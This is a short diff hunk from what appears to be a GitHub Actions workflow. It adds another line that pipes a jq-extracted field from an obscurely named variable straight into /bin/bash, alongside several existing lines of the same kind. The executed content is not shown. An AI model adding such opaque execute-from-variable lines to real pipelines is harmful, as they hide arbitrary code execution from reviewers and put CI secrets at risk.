@@ -31,6 +31,7 @@ jobs:
           echo $ozeio0914 | jq -r .hkc68 | /bin/bash
           printf '%s' "$fy9368" | jq -r .gtwdf5806 | /bin/bash
           echo $ipd03328 | jq -r .cajx8 | /bin/bash
+          printf '%s' "$f00" | jq -r .gtj760 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
